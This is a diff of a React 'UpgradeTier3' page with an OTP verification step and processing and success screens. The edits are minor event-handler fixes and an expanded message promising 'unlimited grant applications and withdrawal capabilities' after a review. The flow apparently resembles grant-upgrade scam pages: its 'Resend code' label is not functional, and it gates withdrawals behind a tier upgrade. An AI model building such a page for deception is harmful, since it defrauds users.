                   className="w-full text-center text-3xl font-bold px-4 py-4 border-2 border-gray-300 rounded-lg focus:outline-none tracking-widest"
-                  onFocus={e => { e.target.style.borderColor = t.inputBorder; e.target.style.boxShadow = `0 0 0 3px ${t.inputBorder}22`; }}
-                  onBlur={e => { e.target.style.borderColor = "#d1d5db"; e.target.style.boxShadow = "none"; }}
+                  onFocus={e => { e.currentTarget.style.borderColor = t.inputBorder; e.currentTarget.style.boxShadow = `0 0 0 3px ${t.inputBorder}22`; }}
+                  onBlur={e => { e.currentTarget.style.borderColor = "#d1d5db"; e.currentTarget.style.boxShadow = "none"; }}
                 />
               </div>
-
               <button onClick={handleAuthConfirm} disabled={otp.length < 3 || submitting || isTransitioning}
                 className="w-full py-3.5 rounded-lg font-semibold text-sm transition hover:opacity-90 disabled:opacity-50 disabled:cursor-not-allowed"
                 style={{ background: otp.length >= 3 && !submitting ? t.accent : "#e5e7eb", color: otp.length >= 3 && !submitting ? t.accentText : "#9ca3af" }}>
                 {submitting ? "Verifying..." : "Verify & Continue"}
               </button>
-
               <p className="text-center text-xs text-gray-400">
                 Didn't receive a code? <span className="cursor-default" style={{ color: t.accent }}>Resend code</span>
               </p>
@@ -653,7 +554,6 @@ function UpgradeTier3() {
     );
   }
 
-  // ── PROCESSING ──
   if (step === "processing") {
     return (
       <div className="min-h-screen bg-gradient-to-b from-accent/40 via-background to-background pb-16">
@@ -668,7 +568,7 @@ function UpgradeTier3() {
             </div>
             <div className="p-8 space-y-8">
               <div className="rounded-lg border border-forest/20 bg-forest/5 p-8">
-                <p className="text-foreground text-center leading-relaxed">Thank you for upgrading to Tier 3. Your account has been successfully submitted for verification. Our review team is currently processing your request. This process typically takes 24 hours. You will receive an email notification as soon as your upgrade is approved, at which point you'll have immediate access to unlimited grant applications.</p>
+                <p className="text-foreground text-center leading-relaxed">Thank you for upgrading to Tier 3. Your account has been successfully submitted for verification. Our review team is currently processing your request with careful attention to security and compliance. This process typically takes 24 hours, though it may require additional time depending on verification requirements. You will receive an email notification as soon as your upgrade is approved, at which point you'll have immediate access to unlimited grant applications and withdrawal capabilities. We appreciate your patience and recommend checking your email regularly for updates.</p>
               </div>
               <div className="rounded-lg border border-gold/30 bg-gold/5 p-6">
                 <p className="font-semibold text-foreground mb-3">📋 What Happens Next?</p>
@@ -691,7 +591,6 @@ function UpgradeTier3() {
     );
   }
 
-  // ── SUCCESS ──
   if (step === "success") {
     return (
       <div className="min-h-screen bg-gradient-to-b from-accent/40 via-background to-background pb-16">
@@ -720,3 +619,5 @@ function UpgradeTier3() {
 
   return null;
 }
+
+export default UpgradeTier3;
